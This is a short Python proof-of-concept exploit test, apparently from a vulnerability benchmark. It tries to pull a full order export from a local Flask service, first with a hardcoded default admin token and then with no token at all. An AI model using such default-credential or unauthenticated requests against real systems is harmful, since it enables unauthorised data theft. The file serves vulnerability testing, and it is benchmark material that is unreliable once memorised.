"""PoC: Unbounded data export via spoofable admin header (CWE-400)."""
from mosaic.oracle.exploit import ExploitTest


class UnboundedExportExploit(ExploitTest):
    def __init__(self, base_url="http://localhost:39120"):
        super().__init__(base_url)

    @property
    def chain_id(self):
        return "flask_resource_unbounded_export"

    def setup(self):
        pass

    def execute(self):
        evidence = []
        # The default ADMIN_TOKEN is hardcoded as 'admin-export-token'
        resp = self.http_get(
            "/api/export/orders?full=true",
            headers={"X-Admin-Token": "admin-export-token"},
        )
        if resp.status_code == 200:
            body = resp.json()
            total = body.get("total_count", 0)
            evidence.append(f"Full export returned {total} orders with default admin token")
            if total > 0:
                return True, "CWE-400 Unbounded export with spoofable default admin token. " + " | ".join(evidence)
        evidence.append(f"Export returned status {resp.status_code}")

        # Also try without token to check if auth is even enforced
        resp2 = self.http_get("/api/export/orders?full=true")
        if resp2.status_code == 200:
            evidence.append("Full export works WITHOUT any admin token!")
            return True, "CWE-400 Unbounded export with no auth. " + " | ".join(evidence)

        return False, "Unbounded export not confirmed. " + " | ".join(evidence)
